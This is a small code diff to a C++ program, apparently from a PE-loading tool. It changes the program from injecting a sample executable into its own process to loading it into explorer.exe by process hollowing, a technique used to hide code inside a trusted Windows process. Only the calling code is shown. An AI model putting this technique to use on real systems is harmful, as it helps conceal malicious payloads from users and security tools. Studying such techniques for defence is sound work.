@@ -3,7 +3,7 @@
  **/
 
 #include <iostream>
-#include "inject.h"
+#include "hollow.h"
 
 int main(int argc, char **argv)
 {
@@ -11,9 +11,8 @@ int main(int argc, char **argv)
     pe_data_t pe_data;
     pe_data_read(&pe_data, "data/sample.exe");
 
-    /* execute pe in current process */
-    unsigned long pid = GetCurrentProcessId();
-    pe_data_inject(&pe_data, pid);
+    /* inject pe via process hollowing */
+    pe_data_hollow(&pe_data, "C:\\Windows\\explorer.exe");
 
     pe_data_free(&pe_data);
     return 0;
